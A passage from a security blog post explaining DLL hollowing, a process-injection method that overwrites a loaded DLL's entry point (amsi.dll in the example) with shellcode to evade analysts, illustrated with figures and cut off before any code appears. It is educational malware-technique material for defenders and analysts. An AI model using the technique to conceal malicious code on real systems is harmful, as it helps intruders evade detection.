# https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
  <body class="mx-auto lang-en section-blog type-blog antialiased overscroll-none">


	

    

<!-- Global Header -->

<!-- End Global Header -->
		<main id="main" class="main overflow-x-hidden">

			

   



<section class="c-page-header relative bg-code text-white">

    <div class="px-p24 mq768:px-p48 mq1024:px-p56 c-header-wrap v-blog-header">
    <div class="max-w-p1440 mx-auto">
      <div class="flex flex-col mq768:flex-row">
        <div class="flex relative z-20 items-center mq768:w-1/2 order-1 py-p48 mq1024:py-p56 mq768:pr-p64 mq1024:pr-p56">

          <div class="w-full">

            

  
<ul class="mb-p64 mq1024:mb-p80 flex flex-wrap text-white">
                <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog">Blog</a></li>
            <li class="after:content-['/'] last:after:hidden after:mx-p8"><a class="text-sm hover:underline focus:underline" href="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide">Burrowing a Hollow in a DLL to Hide</a></li>
     </ul>
                        <div class="mb-p32">

                              <div class="mb-p16">
                  <span class="font-mono text-sm">January 30, 2024</span>
                </div>
              
                                                                <h1 class="text-h1 mq1280:text-title-xl">Burrowing a Hollow in a DLL to&nbsp;Hide</h1>
                              
                                        </div>

                          <div class="mb-p16">
                <span class="text-h3 inline-block">
                  Written by
                                                            Scott Nusbaum
                                                      </span>
              </div>
            


            
            
            
            <div class="mt-p64">
                              <span class="c-tag inline-block py-p6 px-p4 border border-gibson rounded-p6 text-gibson text-bd mr-p12 mb-p12 whitespace-nowrap">Malware Analysis</span>
                          </div>
          </div>
        </div>

        <div class="mq768:flex overflow-hidden items-center mq768:justify-end mq768:w-paired-img max-w-p1080 -mx-p24 mq768:mx-none order-2 mq768:absolute inset-y-0 left-paired-img-plus fx" x-data="" x-fx.left.1200="2rem" style="transform: translate3d(-2rem, 0px, 0px); transition-duration: 1.2s;">
          <div class="relative mq768:static mq768:w-full h-full pt-full -mx-p24 mq768:mx-none">
                          <picture class=" w-full"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767065217&amp;s=9314c91159099772e6cfe2e29ae769de, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767065217&amp;s=a08b7f5bd1f7cfa6f846495732469d54 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=600&amp;h=600&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767065217&amp;s=190efb15bff20eef579a6fafef52a1d5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=900&amp;h=900&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767065217&amp;s=4a7ef2452a9d2f888488ce47e9c26dce 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767065217&amp;s=d4abc188f0ccd724b073d2b2e1e07488, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;fm=webp&amp;fit=crop&amp;dm=1767065217&amp;s=818a4d991a79989f269c97ec9ca63639 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767065217&amp;s=65ac2ebe74109ccddf4b4df996142bd5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=480&amp;h=480&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767065217&amp;s=3616e0aaeb9670c6ab845060f7bb90bf 1.5x"><img class="c-img opacity-0 transition-all duration-300 absolute inset-0 object-cover w-full h-full object-center" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-Covers/BurrowingHollow_WebHero.jpg?w=320&amp;h=320&amp;q=90&amp;auto=format&amp;fit=crop&amp;dm=1767065217&amp;s=65ac2ebe74109ccddf4b4df996142bd5" loading="eager" x-data="image({mq1024:{width:600,height:600},DEFAULT:{width:320,height:320}})" :width="getSize()" :height="getSize('height')" alt="" width="600" height="600" style="opacity: 1;"></picture>                      </div>
        </div>
      </div>
    </div>
  </div>

</section>


      
			
						<div class="relative"><section id="contentWell-0" class="c-module relative bg-white text-black py-p64 mq768:py-p96" data-module-num="1" style="z-index: 0;"><div class="px-p24 mq768:px-p48 mq1024:px-p56"><div class="max-w-p1440 mx-auto"><div class="flex flex-col mq1024:flex-row" x-data="{ mobile: ! $breakpoint('mq1024') }" @resize.window="mobile = ! $breakpoint('mq1024')"><div class="mq1024:w-p320 mq1024:pr-p64 grow-0 shrink-0 mq1024:order-1"><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div><div><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Burrowing%20a%20Hollow%20in%20a%20DLL%20to%20Hide%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fburrowing-a-hollow-in-a-dll-to-hide&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div><div class="w-full mq1024:w-content-well mq1024:order-2 flex-1"><div class="c-content"><h2><span>1&nbsp;&nbsp;&nbsp; </span>Burrowing a Hollow in a DLL to Hide&nbsp;</h2><p class="MsoNormal">In this post about common malware techniques, we are still talking about hollowing—but this time, instead of <a href="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe">hollowing a newly created process</a>, we will make a process load a new DLL and then overwrite part of that DLL with our malicious code.<span>&nbsp;</span></p><p class="MsoNormal">We will take two (2) different approaches to DLL hollowing: the first is simpler and the second is more complex. The simpler version will load a DLL into the current process, and the more advanced version will reuse the PPID, spawn a remote process, and then cause that remote process to load the DLL.</p><p class="MsoNormal">As with the previous posts, we will demonstrate these methods in C and C#.</p><h3><span>1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>What is DLL Hollowing?</h3><p class="MsoNormal">DLL hollowing is a form of process injection, which is when an attacker inserts malicious code into known benign software. With DLL hollowing, the attacker can insert the code into the current process or into a remote process's memory space by loading a new DLL and overwriting sections of its code. The goal of the attacker is to hide from casual analysis. When looking for quick wins, researchers or Incident Response analysts will look for any process or executable that does not look normal. In most use cases, the process and the DLL are both benign. Looking at the file system of the EXE and DLL will show nothing out of the ordinary.</p><h3><span>1.2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>How Does it Work?</h3><p class="MsoNormal">In the first scenario, the executable A.exe is started (Note: this doesn't have to be an executable—it could be shell code that executed during an RCE exploit—but for this discussion, it will be an executable). The executable process will then attempt to load a new library (DLL) into its memory space. Once the library has been loaded, the process will then parse the DLL's header information to determine an injection location inside the DLL. Normally, the injection location is the DLL's entry point, but under standard configurations, DllMain is used as the DLL's entry point. Once the entry point has been located, the process will then overwrite the entry point with the malicious code. After the malicious code has been written, a new thread will be created with the entry point as the execution point.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/gif" media="(min-width: 64rem)" srcset=""><source type="image/webp" media="(min-width: 64rem)" srcset=""><source type="image/gif" media="(min-width: 48rem)" srcset=""><source type="image/webp" media="(min-width: 48rem)" srcset=""><source type="image/gif" media="(min-width: 20rem)" srcset=""><source type="image/webp" media="(min-width: 20rem)" srcset=""><source type="image/gif" srcset=""><source type="image/webp" srcset=""><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.files.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/dll_hollowing_basic.gif?dm=1706281316" loading="lazy" x-data="image({mq1024:{width:250,height:500},mq768:{width:250,height:500},mq320:{width:250,height:500},DEFAULT:{width:250,height:500}})" :width="getSize()" :height="getSize('height')" alt="" width="250" height="500" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 1 - Simple DLL Hollowing</figcaption></figure></div><p class="MsoNormal">The following two (2) images show the libraries that are loaded into the process prior to and after our injection. As you can see, the AMSI.dll was not normally part of the loaded libraries.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=ee5ff703a09fb8b90686749ffef613ca, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=9ebbbcf270e4fdf8fe9eeeeb8b5b2a4e 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=b3195b519e55de6cf9ea9ec5676d1849, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=719f8093b24df68d8e604e8dfe88f984 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=c6560e18cb476302f980b0aca81c2882, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=9ebbbcf270e4fdf8fe9eeeeb8b5b2a4e 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=1290978087efd3f210752aa827905c3e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=719f8093b24df68d8e604e8dfe88f984 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=ce4913830e75ee240388e6cc234adaf6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=26536b3eeea8b75828afb42da4910d07 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=5c2b4391c4d6a59af46a6941f1015c64, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=ae4031cf0a755827a71ed83e0bc2d1fa 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=d823bb7d833fbe816b9e5ae9f8a8613d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281260&amp;s=e5b6ff792885a4ef6902625877b056ab 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=ed2e2ba22731996bacf3925971da5730, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=62e8308f2a503b897b8eaf4935403aa8 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig2_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281260&amp;s=ed2e2ba22731996bacf3925971da5730" loading="lazy" x-data="image({mq1024:{width:936,height:450},mq768:{width:936,height:450},mq320:{width:720,height:346},DEFAULT:{width:320,height:154}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="450" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 2 - Libraries Loaded by Default into the Executable</figcaption></figure></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=821668d13719df98d4fee57e8e919e56, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=83be3b6af58a67c4d95184ea13453240 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=8a9469e907b46e3346473ca9f629ec87, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=288931c51d7b00849444b3c6958d4409 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=3f2aabc2495e1476694faa4644d7ff3c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=83be3b6af58a67c4d95184ea13453240 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=ab1b9777960db2a4a40fd0721ff1282a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=288931c51d7b00849444b3c6958d4409 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=9720bd586a5448ec9389224b41210a4e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=5a22153d69d0fb96e09cd4de16779f17 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=9ff40b0c23dfd0bc284b78d523ea4992, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=6f2cd476651e7613945ee77285d7d841 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=663fe5bc23a5b90164300ef7d4ada352, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=479&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281261&amp;s=68913d28fd2c7641513257a973911cfb 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=d4226db5279a1215f8f8b179aa4eb3f0, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=479&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=bf65bdc104c0f1a0fd537759ff802921 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig3_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281261&amp;s=d4226db5279a1215f8f8b179aa4eb3f0" loading="lazy" x-data="image({mq1024:{width:936,height:472},mq768:{width:936,height:472},mq320:{width:720,height:363},DEFAULT:{width:319,height:161}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="472" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 3 - Loaded Libraries after the Addition of our target amsi.DLL</figcaption></figure></div><p class="MsoNormal">Next, we will compare the contents of the unmodified amsi.dll entry point to the modified version. The AMSI.dll's entry point is at the address of 0x7ffb0bcde820, and the first image shows the contents of that address directly before the malicious code is moved in. The second image shows the same entry point after the malicious shellcode overwrote it.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=63da4192bd90b66ffb265fa807f89c00, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=eddec865c7dcc59a1338ad3fc6780c88 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=6a63b729a5e3d0031876fe40c723dbbc, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=b9c8828bb31713cd98704d6708dde74e 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=ab9a91e65f16a75399988391588c88e8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=eddec865c7dcc59a1338ad3fc6780c88 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=e523a5b881ee3d1d20ae6c20af4b6fb3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=b9c8828bb31713cd98704d6708dde74e 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=5dc91af3aeba78014b36555c81237327, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=c8d1435ba060c3ff88a9d1f58aa83044 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=f016620b220535654dc1663c68626e0d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=3f3472cf4e8545557761830ae1e0fed2 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=255a31d1905e134d1fe2c7b008247a49, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281263&amp;s=caaf3459d15fee2027084ddebf8d2d5f 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=4bf6f1c8af535ba96ee484a979402c0c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=a1f548a4c2c986bb76c12a7c2f9b80cf 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig4_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281263&amp;s=4bf6f1c8af535ba96ee484a979402c0c" loading="lazy" x-data="image({mq1024:{width:936,height:594},mq768:{width:936,height:594},mq320:{width:720,height:457},DEFAULT:{width:320,height:203}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="594" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 4 - Original entry point for amsi.dll</figcaption></figure></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" 